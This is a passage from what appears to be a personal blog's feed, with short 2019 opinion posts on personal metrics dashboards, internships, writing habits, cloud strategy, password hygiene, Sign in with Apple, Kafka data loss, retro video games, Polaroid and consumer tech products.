<p>They say you don’t improve what you don’t measure and there are a ton of things I want to improve about myself! In the office we use <a href="https://prometheus.io">Prometheus</a> and <a href="https://grafana.com">Grafana</a> to create dashboards to measure the health and performance of a variety of applications and services. They provide a ton of transparency and visibility into how we’re doing and it’s incredibly easy to spot patterns.</p>

<p>What if we each had our own personal dashboard that measured what was important to us? There are obvious ones such as health and sleep metrics but there can also be a ton based on productivity or life in general. For productivity, some examples may be the number of emails in your inbox or the average time it takes to respond to an email. For life it can be about how much time we’re spending with our families and friends or just pursuing hobbies.</p>

<p>Nearly everything we do can be measured with a little bit of effort and I love the idea of putting together a personal dashboard to measure what I care about. It will inevitably evolve over time as I think of new data to capture and plot but there’s something both empowering and clinical about seeing charts that reflect our lives.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Ideal tech intern projects</title>
   <link href="http://dangoldin.com/2019/07/09/ideal-tech-intern-projects/"/>
   <updated>2019-07-09T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/07/09/ideal-tech-intern-projects</id>
   <content:encoded><![CDATA[
<p>Having a tech internship program is a big investment that companies should not undertake without making sure they can put in the work to make it successful. Some companies approach it as a source of extra help but without giving the interns the support they need it will end up in hurt productivity for them and the rest of the team.</p>

<p>The ultimate goal of an internship is to provide useful work, determine whether there’s an opportunity for a full time role, and sell the candidate on that opportunity. A great way to achieve these ends is to give interns a chance to own a large project that allows them to get a feel for the work and showcase their abilities. The ideal project should have the following traits:</p>

<ul>
  <li>
    <p><strong>Technology</strong>. Each company has their own stack and it’s important to make sure interns are exposed to the way the rest of the team works. Rather than have this project be isolated from the rest of the team it should leverage the same tools and technology that the rest of the team uses and provide a glimpse of how the team operates.</p>
  </li>
  <li>
    <p><strong>Useful but not urgent</strong>. This is self explanatory but the project should be useful since it’s both a way of giving interns a sense of ownership and impact but it cannot be urgent since there is likely a steep learning curve and you do not the rest of the team to have to pick up the slack.</p>
  </li>
  <li>
    <p><strong>Autonomous</strong>. It’s inevitable that there will be questions but the goal should be to not overwhelm the rest of the team. An ideal project will provide enough autonomy to keep the interns busy while challenging them to figure things out on their own. This means that the project should have clear measures of success and minimal amount of nuanced commercial logic which require months to ramp up on and understand.</p>
  </li>
</ul>

<p>A good way of making sure these are hit are to have a brainstorming session with the team to propose as many projects as possible by scanning the backlog and then using the rubrik above to score them against the various dimensions. You should then have a few candidate projects emerge that would be eligible to be picked as an intern project.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Power of habit</title>
   <link href="http://dangoldin.com/2019/07/08/power-of-habit/"/>
   <updated>2019-07-08T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/07/08/power-of-habit</id>
   <content:encoded><![CDATA[
<p>Last year I feel behind my writing and had to scramble starting in November to hit my goal of two blog posts a week. I unfortunately didn’t start this year strong and am already behind. In the first half of the year I should have written 52 posts but I’m currently at 24, just under half off the goal. This is not great if I want to have a somewhat normal November and December where I’m not spending nearly every free moment of the day writing so I’ve decided to write a post every day in July in order to eat into the debt.</p>

<p>Surprisingly, it hasn’t been that difficult. Knowing that I need to hit this goal gives me enough motivation and purpose to just start writing and more often than not that turns into a blog post. There are quite a few posts that are still in “draft” status and a text file containing ideas that may eventually turn into posts but just knowing I need to have something written by the end of the day is enough to get me going.</p>

<p>Habits are incredibly powerful, especially if they come with a streak. Most people will take the pain rather than break a streak and the longer the streak the more one does to maintain it. I’m only a week in but already feel a strong urge to keep the momentum going. In fact, I’m looking at my calendar for the days ahead to see what I have in the evenings in order to make sure that I either have the time to write or prepare a post beforehand. And this only a week in!</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Video of my Data Council NYC talk</title>
   <link href="http://dangoldin.com/2019/07/07/video-of-my-data-council-nyc-talk/"/>
   <updated>2019-07-07T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/07/07/video-of-my-data-council-nyc-talk</id>
   <content:encoded><![CDATA[
<p>Last November I gave a talk at Data Council NYC ‘18 titled “The Highs and Lows of Building an Adtech Data Pipeline” and finally saw that the video has been uploaded to YouTube. If you’re interested in hearing a runthrough of the different iterations our data pipeline went through over the course of 6 years definitely give it a watch and leave comments and feedback. I’m not the most natural of public speakers and there were moments I spoke much quicker than I should have but hopefully having the slides on the side make it a tad more understandable.</p>

<amp-youtube data-videoid="Y7VNk73qGRU" layout="responsive" width="1280" height="720"></amp-youtube>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Credit card merchant fees</title>
   <link href="http://dangoldin.com/2019/07/06/credit-card-merchant-fees/"/>
   <updated>2019-07-06T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/07/06/credit-card-merchant-fees</id>
   <content:encoded><![CDATA[
<p>A <a href="https://stratechery.com/2019/facebooks-cryptocurrency-the-problem-and-benefit-of-credit-cards-the-facebook-payment-network/">Stratechery post</a> covering Facebook’s cryptocurrency launch mentions that credit card merchant fees are generally a flat $0.29 fee plus 1.5~3.5% of the transaction. The argument is that the market is efficient and if there was a way to drop them one of the credit card providers would have to gain an advantage.</p>

<p>I don’t buy this argument. I don’t have the history of merchant fees but my suspicion is that they changed minimally, if at all, over the past few decades despite the massive amount of data being collected and the processing capability to go with it. The rates could be much lower but there’s limited incentive to get there since credit card companies can charge on both the consumer and merchant side. There’s a big incentive to optimize on the consumer side since they’re the ones spending the money and understanding the default and fraud risk are major drivers of profitability. On the merchant side it’s a stable rate with little reason to change it.</p>

<p>Yet there’s a big opportunity to be more intelligent here. Imagine if the rate varied over time based on customer behavior. If I’m selling a subscription service to a small and loyal audience the default rate will be low and my merchant fee should reflect that. Similarly, companies likely have higher credit worthiness than individuals and it makes sense to charge lower merchant fees for commercial purchases.</p>

<p>It’s possible and likely that this approach would be abused and may lead to punitive rates for some merchants but there should be a way that’s fair and intelligent. The existing credit card companies may not have any incentive to improve the merchant side but it will happen.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Future of cloud is hybrid</title>
   <link href="http://dangoldin.com/2019/07/05/future-of-cloud-is-hybrid/"/>
   <updated>2019-07-05T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/07/05/future-of-cloud-is-hybrid</id>
   <content:encoded><![CDATA[
<p>Cloud providers are doing all they can to lock companies into their own offerings but my suspicion is that the future looks hybrid. On the surface they all offer the same base functionality but there’s a variety of specialization on the edges offered by Amazon vs Microsoft vs Google vs your own data center. My suspicion is that over time more and more companies will adopt hybrid setups that allow them to leverage the strengths of each platform. For example, using Google for their AI and ML capabilities, Microsoft for integrating with an existing data center (and not competing with your existing business!), your own data center for the well defined and scoped use case, and Amazon for everything else.</p>

<p>All this is made easier by the growth of orchestration services, such as Kubernetes, that allow you to write code that is independent of where or how it’s deployed. That makes it much easier to shift your usage to the provider that gives you the best value.</p>

<p>These days, a hybrid setup is not very easy to configure. It requires having a team familiar with multiple environments, the tooling to work across them, as well as a variety of configurations and deployments to communicate securely across clouds. But as with any new technology this will get easier and more approachable as the ecosystem is built out to support these new deployments. Unfortunately, the providers are intelligent enough to offer steep discounts in return for long term contracts and spend commitments. These lead to lock in and make it  difficult to be truly provider agnostic but the infrastructure and technology will be there.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Increasing the bar for reelection</title>
   <link href="http://dangoldin.com/2019/07/04/increasing-the-bar-for-reelection/"/>
   <updated>2019-07-04T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/07/04/increasing-the-bar-for-reelection</id>
   <content:encoded><![CDATA[
<p>I avoid writing about politics but in honor of July 4th I decided to pen some thoughts around elections.</p>

<p>Last year I wrote a <a href="http://dangoldin.com/2017/11/25/make-all-laws-temporary/">post</a> proposing that all laws should be temporary and upon expiration require a higher and higher majority to be sustained. What if we adopt a similar policy for electing politicians? In the United States different offices have different term limits: a Supreme Court Justice has a lifetime appointment, a senator has 6 years, a president has 4 (and limited to two terms), and a congressperson has 2. The intuition behind these is that a Supreme Court Justice should have a long term outlook and not be influenced by any short term incentives. I don’t know why the others have such specific term limits or why a senator term is longer than a presidential term while a congressperson term is shorter than a presidential term. The intent of these is to avoid corruption by giving people a chance to course correct if a political is not working out but the exact years and the ratios between the offices feel arbitrary.</p>

<p>What if similar to the temporary law proposal we had no term limits but made the reelection requirement increase over time? For example requiring political candidates to require a larger fraction of the vote in every subsequent election. This biases towards new politicians but gives strong incumbents the ability to keep getting reelected. The motivation is to decrease the likelihood of lifetime politicians and encourage officials that are actually closer to the people. In fact, while doing some research for this post I came across the <a href="https://en.wikipedia.org/wiki/Term_limits_in_the_United_States">Wikipedia article</a> for US term limits that highlighted that in the Roman Republic some elected officials only held office for a single year and were unable to run again for 10. Imagine what our politicians would look like if we had a similar policy in place. I bet our representation would be much more reflective of our actual demographics.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Revamping my online security</title>
   <link href="http://dangoldin.com/2019/07/03/revamping-my-online-security/"/>
   <updated>2019-07-03T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/07/03/revamping-my-online-security</id>
   <content:encoded><![CDATA[
<p>Out of curiosity I checked out <a href="https://haveibeenpwned.com/">haveibeenpwned</a> to see if my data was exposed in any breach and it turns out my email was found in 22 breaches. I’m not surprised - I’m probably registered on hundreds, if not thousands, of sites and it’s only a matter of time before some of them get compromised. You should assume that every time you register for a site that data will get leaked and act accordingly - this means using a unique password on every site and, if possible, even obfuscating your email address. For the past year and a half I’ve embraced the approach of assuming my email address is public but investing heavily in strong, secure, and randomly generated passwords that are unique to every site. I’ve also been slowly going through my older registrations and updating the passwords.</p>

<p>It’s not easy going through every registration and updating the password so I’ve prioritized the sites that are important, such as those containing financial or personal identifiable information, and those that do not offer 2FA. The rest, if compromised, wouldn’t give the attacker any more data than my email would so I’m not worrying about them.</p>

<p>This will never get easier so it’s important to both get into better habits going forward and upgrade the security of the existing accounts. The reality is we’re all only a breach away from having to deal with a whole world of pain and investing in security, while miserable, is going to save us from a lot of pain later on. If you haven’t checked out haveibeenpwned give it a shot and be surprised.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Combine registration and sign in</title>
   <link href="http://dangoldin.com/2019/07/02/combine-registration-and-sign-in/"/>
   <updated>2019-07-02T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/07/02/combine-registration-and-sign-in</id>
   <content:encoded><![CDATA[
<p>The goal of nearly every site or app is to get users to engage as quickly as possible. That’s why it’s surprising that so many sites have a separate flow for registration versus sign in. There’s no good reason that these two flows shouldn’t be combined.</p>

<p>A part of nearly every registration is entering an email and password so why not make them the first step of the sign up process? If that email and password are already in the system just log her in. And if not then you have the email address of a to-be-registered user. The only real risk is if someone thought they had an account and wanted to sign in but instead signed up - and that’s a good problem to have from the application side since you have the contact info of an interested user.</p>

<p>I’m impressed whenever I encounter a site that does this since it’s so rare - it’s not a complicated change and while not impactful it is a nice and easy way of reducing friction and making everyone a tad more efficient.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Sign In with Apple</title>
   <link href="http://dangoldin.com/2019/07/01/sign-in-with-apple/"/>
   <updated>2019-07-01T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/07/01/sign-in-with-apple</id>
   <content:encoded><![CDATA[
<p>Apple recently made the announcement that apps that provide third party login will also be required to offer a Sign in with Apple option. Apple will then, in turn, anonymize the email address and thus anomyze the user. The idea here being that the app will only have access to the random email generated by Apple and all email will have to be proxied through the email address generated by Apple.</p>

<p>It’s a noble idea and Apple is clearly leaning into their privacy positioning hard. They’ve been positioning themselves as the anti-Google and this is an example of leveraging their market dominance to protect the customer.</p>

<p>I suspect it’s more marketing than truth. This will help but the critical piece of tracking information, IDFA, is still tied to the device and can be accessed easily by the various tracking companies. The app itself may not have access to the de-anonymized user information but having access to IDFA doesn’t block or stop any of the tracking. I also suspect that there’s some sketchy service or product somewhere that allows companies to get access to email address from an IDFA.</p>

<p>The one real benefit is that compromised accounts stay isolated and the risk that one account compromises others is significantly lowered. Right now if an app is compromised and the attacker has access to the email address and some sort of password (plaintext, hashed, encrypted) it’s possible to crack that password. And since most people reuse their password and email addresses across multiple sites the attacker will have a much easier time breaking into them. Having a different email address will make it significantly more difficult, if not impossible, to access the user’s other accounts.</p>

<p>So while I think there’s a fair amount of spin on this and it’s not going to be as impactful as many believe there’s still value here and I’m curious to see how it manifests itself.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Tightly coupled data loss</title>
   <link href="http://dangoldin.com/2019/06/15/tightly-coupled-data-loss/"/>
   <updated>2019-06-15T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/06/15/tightly-coupled-data-loss</id>
   <content:encoded><![CDATA[
<p>A few months while doing some Kafka maintenance we ran into an issue that caused us to lose approximately 10% of records across all our topics over the course of an hour. It was a big screw up but what made it worse was the interaction between the records. Our records represent the life cycle of an ad from the auction, to the render, to whether it was in view, and beyond. Rather than send all the information along for each on we keep the records as lightweight as possible and rely on our backend processing to join them together to come up with an auction log.</p>

<p>You can probably tell where I’m going with this but since the loss was distributed uniformly across our various topics it the final effect was a much larger drop. For example knowing that a particular auction resulted in a click isn’t very helpful if you don’t have the other details of that auction.</p>

<p>It’s obvious in hindsight but the general idea is if your pipeline depends on joining records from multiple streams a uniform outage will have a much higher impact than the actual number of records dropped due to the interactive nature. A simple example is if you have two Kafka topics that end up being joined during processing and you lose 10% of records for each topic you don’t end up with 90% data left but rather 81% (0.9 * 0.9). This gets even worse when you move to 3 dependent topics (72.9% = 0.9 * 0.9 * 0.9). It’s not as simple since some topics are more important to capture than others and they all have different cardinality but the key idea is that in any system with tightly coupled components any uniform outage the combined impact is more than the sum of the individual outages. This applies not just to Kafka but to any system that requires multiple components working together - for example a microservice architecture where 10% of requests fail over the course of an hour will have a higher failure rate than 10%.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Video games of my youth</title>
   <link href="http://dangoldin.com/2019/05/31/video-games-of-my-youth/"/>
   <updated>2019-05-31T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/05/31/video-games-of-my-youth</id>
   <content:encoded><![CDATA[
<p>Lately I’ve been feeling nostalgic about the video games from my youth and spent some time browsing YouTube and trying to remember my favorites. I was exclusively a PC gamer except for one month period where I had a Sega Genesis - which my parents got for me as a reward for reading a 1000 pages of Russian. Unfortunately (or fortunately), our “deal” did not include any additional games so the system was returned within a month of me getting it. I have a ton more memories from the mid-90s but these stood out as my earliest memories. I’m pretty sure I didn’t beat any of them but it was a wonderful time playing these as a kid in the early 90s.</p>

<ul class="thumbnails">
  <li class="span8">
    <div class="thumbnail">
      <amp-youtube data-videoid="7VRP_mg8PtM" layout="responsive" width="640" height="480"></amp-youtube>
      <p><strong>Golden Axe</strong>. I loved the hack and slash here and remember being awed by the graphics. This also had a great multiplayer component that I spent hours on with my brother.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <amp-youtube data-videoid="t7E-P4VJbdg" layout="responsive" width="640" height="480"></amp-youtube>
      <p><strong>Jill of the Jungle</strong>. I came across this game in a shareware (remember those?) magazine and after trying the demo really wanted the actual game. I don't recall whether I saved up to buy it or whether it was a gift but was a big fan of the side-scroller style action/adventure game.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <amp-youtube data-videoid="YUyQSfKRU1w" layout="responsive" width="640" height="480"></amp-youtube>
      <p><strong>Commander Keen</strong>. Similar to the above this was a fun side-scroller that was just fun to play and explore. I don't recall how I got into this but do remember eagerly trying to get the sequels.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <amp-youtube data-videoid="x8o0a5ntxfc" layout="responsive" width="640" height="480"></amp-youtube>
      <p><strong>Wolfenstein 3D/Doom</strong>. I grouped these together since they were both first person shooters and I jumped from one to the other as soon as it came out. I was arguably way too young to play either one but had a blast. I also recall mods of the game but don't remember the actual details.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <amp-youtube data-videoid="ivHFP3dJAkM" layout="responsive" width="640" height="480"></amp-youtube>
      <p><strong>Impossible Mission</strong>. I spent a lot of time on this game. I don't even think I knew what the goal was other than to run around and explore.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <amp-youtube data-videoid="uZDG4dlU5uY" layout="responsive" width="640" height="480"></amp-youtube>
      <p><strong>Alley Cat</strong>. I have no idea why I played this game as much as I did. It had a series of mini-levels and there were definitely favorites and levels I hated.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <amp-youtube data-videoid="iSwYY2eoKhQ" layout="responsive" width="640" height="480"></amp-youtube>
      <p><strong>Alone in the Dark</strong>. Another game I should have probably not been playing. I don't recall liking this too much since it felt slow and I didn't know what I was doing but I do have memories.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <amp-youtube data-videoid="Xv20j8ChtRY" layout="responsive" width="640" height="480"></amp-youtube>
      <p><strong>Prince of Persia/Karateka</strong>. No list could be complete without this. This game was way too hard for me until I found cheat codes.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <amp-youtube data-videoid="K2sKp4Fn7_8" layout="responsive" width="640" height="480"></amp-youtube>
      <p><strong>Airborne Ranger</strong>. This brings back memories. It was so fun running around and exploring the map trying to complete various objectives.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <amp-youtube data-videoid="JjzzSqCxwG8" layout="responsive" width="640" height="480"></amp-youtube>
      <p><strong>Star Goose</strong>. Damn this game was difficult. The graphics blew me away but what an incredibly difficult game.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <amp-youtube data-videoid="7tm_2ZNOzsw" layout="responsive" width="640" height="480"></amp-youtube>
      <p><strong>Budokan</strong>. The graphics were great and what's not to liking about a karate fighting game? I vaguely recall the nunchucks being the easiest to use.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <amp-youtube data-videoid="tHw9Xu89jEM" layout="responsive" width="640" height="480"></amp-youtube>
      <p><strong>Lakers versus Celtics and the NBA Playoffs</strong>. I knew nothing about basketball yet enjoyed playing the game - probably for the graphics. My most significant memory here is having to type in words from the manual in order to bypass the theft protection.</p>
    </div>
  </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Patents and Patent Law</title>
   <link href="http://dangoldin.com/2019/05/04/patents-and-patent-law/"/>
   <updated>2019-05-04T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/05/04/patents-and-patent-law</id>
   <content:encoded><![CDATA[
<p>Less than half of <a href="https://www.amazon.com/Triumph-Genius-Edwin-Polaroid-Patent/dp/1627227695">A Triumph of Genius: Edwin Land, Polaroid, and the Kodak Patent War</a> is spent on the biography of Edwin Land. Rather, the majority of the book is spent on the details of the 7 year Polaroid/Kodak lawsuit. I didn’t have an appreciation for the complexity of patent law until reading the book. It’s both incredibly dry but also incredibly fascinating.</p>

<p>Patents and patent law are critical to innovation but the entire legal process of a patent lawsuit is fascinating and dangerous. Experts spend time designing solutions that are then patented. And then it is up to lawyers and judges to determine whether these patents were legitimate. There’s so much nuance and complexity that needs to be explained that it’s not surprising that the majority of patent lawsuits end up settling - neither side wants to bet on a subjective outcome.</p>

<p>I used to dismiss patents as obvious but there’s so much I didn’t appreciate. The entire process of discovery where you’re going through documents and intervies on both sides sounds extremely complicated. As a lawyer you need to understand the technology well enough to determine whether the huge amount of information you’re going through is valuable and where within a lawsuit it may fit. It’s treacherous and has the potential to make or break a case. One bit of evidence can be enough to show hidden knowledge or motivation that can influence the case outcome.</p>

<p>It’s an incredibly difficult job and something I didn’t fully understand until slogging through the Polaroid/Kodak lawsuit details.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Polaroid and Dr. Edwin Land</title>
   <link href="http://dangoldin.com/2019/04/30/polaroid-and-dr-edwin-land/"/>
   <updated>2019-04-30T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/04/30/polaroid-and-dr-edwin-land</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/edwin-land-2048-1536.jpg" width="2048" height="1536" alt="Dr. Edwin Land" layout="responsive"/>

<p>I recently finished <a href="https://www.amazon.com/Triumph-Genius-Edwin-Polaroid-Patent/dp/1627227695">A Triumph of Genius: Edwin Land, Polaroid, and the Kodak Patent War</a> which starts with a wonderful biography of Edwin Land and ends with a ton of detail about the Polaroid/Kodak lawsuit. Polaroid was a remarkable company and it’s both amazing that it’s no longer around and remarkable that the modern tech world doesn’t seem to appreciate Polaroid and Edwin Land. We put Steve Jobs on a pedestal but Edwin Land was the precursor. He leveraged technology to create incredible consumer products and made Polaroid the Apple of its day.</p>

<p>Polaroid is gone but it’s a shame that so few of us have an appreciation for it in its prime. These days, so many advances are digital that we take them for granted but it must have been inspiring to be at the introduction of the SX-70, the first truly one step instant camera.</p>

<img src="http://dangoldin.com/assets/static/images/sx70_2k_2k.jpg" width="2000" height="2000" alt="SX-70 Polaroid camera" layout="responsive"/>

<p>If you’ve ever taken a photography class and developed a black and white photo you know how complicated the development process is. Color is an order of magnitude more difficult. Now imagine being able to do that inside a camera. The achievement is difficult to imagine now but it must have been unfathomable to those that saw it for the first time in the 70s.</p>

<p>We stand on the shoulders of giants and it’s important for us to appreciate that every now and then. A good way is to read history books and get an understanding of the challenges our predecessors faced, struggled with, and overcame.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Gerrymandering</title>
   <link href="http://dangoldin.com/2019/04/27/gerrymandering/"/>
   <updated>2019-04-27T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/04/27/gerrymandering</id>
   <content:encoded><![CDATA[
<p>I tend to avoid blogging about politics but I couldn’t help but rant against gerrymandering. The concept is rooted in the idea that political parties can divide voting areas in order to bias the populations in their favor. It doesn’t make any sense that in a functional democracy voting districts can be so easily manipulated.</p>

<p>The fact that one sees numerous examples of the ridiculous geographic shapes that can develop should be sign-enough that it’s an irrational approach.</p>

<img src="http://dangoldin.com/assets/static/images/gerrymandering-washpo.png" width="749" height="503" alt="Gerrymandering examples" layout="responsive"/>
<p class="caption">Gerrymandering example from the <a href="https://www.washingtonpost.com/news/wonk/wp/2014/05/15/americas-most-gerrymandered-congressional-districts/?noredirect=on">Washington Post</a>.</p>

<p>Instead, why not impose some constraints? The entire point is to come up with geometric shapes and there’s a ton of mathematical research to design the outcome we want. The goal should be a system that has enough constraints that only a single outcome is possible. Maybe it has something do with the convexity of the shapes or the relationship between the dimensions but it’s shocking how terrible and prone to manipulation the current system is.</p>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>Free as in puppy</title>
   <link href="http://dangoldin.com/2019/04/23/free-as-in-puppy/"/>
   <updated>2019-04-23T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/04/23/free-as-in-puppy</id>
   <content:encoded><![CDATA[
<p>I’ve known about “free as in beer” and “free as in speech” for a while now but only recently have I learned about “free as in puppy.” I came across the phrase while reading a <a href="https://stratechery.com/2019/a-regulatory-framework-for-the-internet/">Stratechery article</a> describing various ways of thinking about regulation. The idea is that just like getting a free puppy, you get it for free but it comes with a significant long term cost.</p>

<p>I’m a big fan of the phrase and it highlights a very common tradeoff we make, especially in engineering. We often get carried away solving a problem but fail to consider the long term cost of maintenance and support. By the time we discover these long term costs the product is entrenched and we’re on the hook for maintaining it in its current form. It’s important to slow down and realize that nearly all software we write is in the “free as in puppy” camp. Writing the code to work is the easy part - writing it to work with no ongoing cost is the challenge.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>YouTube's popularity</title>
   <link href="http://dangoldin.com/2019/03/22/youtubes-popularity/"/>
   <updated>2019-03-22T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/03/22/youtubes-popularity</id>
   <content:encoded><![CDATA[
<p>I know YouTube is huge but it’s amazing how small of a role it plays in my life. The statistics make it seem as if nearly every person online is addicted to YouTube and yet I barely use it. The extent of my YouTube experience is watching how-to videos whenever I need to do something around the house.</p>

<p>The most recent time I watched YouTube was a directed search for a how to video on how to disassemble and unclog a bathtub drain. Beyond that I can’t recall the last time I watched a YouTube video. Every once in a while I will get nostalgic and watch some classic video game videos but other than that my YouTube watching is minimal.</p>

<p>I know that YouTube is extremely popular but I have a difficult time reconciling that given my usage. It’s yet another example of how my attitude towards the modern digital world seems at odds with the rest of the world.</p>

<amp-youtube data-videoid="5DlTexEXxLQ" layout="responsive" width="640" height="480"></amp-youtube>
<p class="caption">I'm aware of the irony of embedding a YouTube clip in this post but it's too true to pass up.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Airbnb and HotelTonight</title>
   <link href="http://dangoldin.com/2019/03/17/airbnb-and-hoteltonight/"/>
   <updated>2019-03-17T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/03/17/airbnb-and-hoteltonight</id>
   <content:encoded><![CDATA[
<p>A few weeks ago Airbnb <a href="https://press.airbnb.com/airbnb-signs-agreement-to-acquire-hoteltonight/">announced</a> that they would be acquiring Hotel Tonight. This was a surprise - throughout its history Airbnb has made a point to compete with hotels and my gut was that hotels would not be too happy to partner with a competitor. I understand that Airbnb is trying to grow before their inevitable IPO and to do so they need to invest in growth. I also subscribe to the argument that from their standpoint they’re focused on giving people a place to stay and not necessarily that concerned with the exact medium - private rental or hotel or whatever else.</p>

<p>It’s just surprising that hotels would go along with this. On one hand they have a room that will be unfilled and HotelTonight is an option that gives them immediate revenue. On the other hand it’s supporting a competitor which in turns makes customers less likely to book a hotel directly the next time. Maybe this isn’t a problem since unless you’re a business or frequent traveler you use an aggregator/hotel search engine already. Ultimately I think this will be an interesting case study to see whether Airbnb’s consumer relationship is strong enough to overcome the resistance of the hotels themselves.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>LinkedIn's terrible messaging experience</title>
   <link href="http://dangoldin.com/2019/03/10/linkedins-terrible-messaging-experience/"/>
   <updated>2019-03-10T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/03/10/linkedins-terrible-messaging-experience</id>
   <content:encoded><![CDATA[
<p>This is a bit of a ranty post but it’s incredible how poor the LinkedIn messaging experience is. If anyone sends me a LinkedIn message I get an email telling me that so-and-so sent me a message. To read the actual message I need to clickthrough to get to the LinkedIn site. I get it, they want to increase engagement and have me access the site and show me something new. It’s just a ridiculously poor user experience. They could easily include the message text and then I can decide whether it’s something I need to respond to and when. Instead I get a useless notification telling me that I have a new message. It’s as if the LinkedIn message experience was modeled after AOL’s “you’ve got mail.”</p>

<p>What’s amazing is that LinkedIn knows this is a terrible experience and doesn’t actually adopt it for the paid accounts. If a recruiter sends me a message I see it in the LinkedIn notification email. Similarly, I have a recruiter account and see responses to my messages in the notification email. I understand the need to differentiate the free vs paid accounts but doing it through message notifications seems incredibly petty. Instead of hobbling the experience for the standard account why not make the premium accounts that much better?</p>

<img src="http://dangoldin.com/assets/static/images/linkedin-messaging-standard.png" alt="The standard email notification" width="527" height="183" layout="responsive"/>
<p class="caption">The standard email notification doesn't include the actual message.</p>

<img src="http://dangoldin.com/assets/static/images/linkedin-messaging-recruiter.png" alt="The recruiter email notification" width="568" height="233" layout="responsive"/>
<p class="caption">The recruiter version contains the message.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Dropbox should drop the freemium model</title>
   <link href="http://dangoldin.com/2019/02/28/dropbox-should-drop-the-freemium-model/"/>
   <updated>2019-02-28T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/02/28/dropbox-should-drop-the-freemium-model</id>
   <content:encoded><![CDATA[
<p>This is a bit heretical but I suspect Dropbox would make more money if it moved away from a freemium model. I have been a user of the free Dropbox account for multiple years now and due to their various promotions have gotten my free storage up to 6GB and yet I use just under 4GB. I don’t use it to store images but instead use it to store important documents that I want to both keep safe but also frequently access across multiple devices. It’s unlikely I’m going to upgrade to a new plan. The only reason would be for photo storage but there are a ton of free or cheaper options.</p>

<p>I don’t know the details but I suspect there are a ton of customers just like me. We find Dropbox incredibly convenient but the free tier is good enough and we see no reason to pay. Yet if they did move to a paid-only product there would be some churn but I expect most of us would just pay to maintain our workflow. And once we had the additional space we’d find more use for it which would in turn make us hesitant to leave.</p>

<p>Freemium models use to be in vogue but maybe we’re past them. Dropbox needed the freemium model to grow quickly and make their presence known but at this point the majority of the tech literate must be aware of Dropbox. They are either using it or are not and a freemium model makes little sense when you’re at the point where everyone knows who you are.</p>

<p>Of course I know very little about their economics or actual reach so this is pure speculation but there is something to be said about starting with a freemium model and then abandoning it when you get huge. It will annoy the hell out of your customers but will likely result in more revenue and profit. The problem is if you go down this road it’s likely impossible to undo it since all the dropped freemium customers will feel betrayed and lose trust. It’s an interesting thought and was spurred by last week’s <a href="https://venturebeat.com/2019/02/22/dropbox-earnings-beat-estimates-but-shares-fall-on-q1-guidance/">earnings report</a> and the resulting stock price drop. It’s unlikely Dropbox will do anything to rock the boat but If the results continue to be disappointing this may end up happening.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Netflix recommendation system failure</title>
   <link href="http://dangoldin.com/2019/02/10/netflix-recommendation-system-failure/"/>
   <updated>2019-02-10T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/02/10/netflix-recommendation-system-failure</id>
   <content:encoded><![CDATA[
<p>I have zero interest in horror or drama and have never watched any of them on Netflix yet Netflix decided to automatically start playing the gory intro to their new Ted Bundy series. I understand their desire to highlight their shows but autoplaying something that gory just seems like a terrible decision, especially given my viewing history.</p>

<p>Many people will launch Netflix with their families around and having something so graphically violent greet you is a surefire way to lose fans and subscribers. It seems obvious that a company should not be autoplaying violence and I’m surprised that Netflix, a company that takes pride in its recommendation system, managed to do something this tone-deaf.</p>

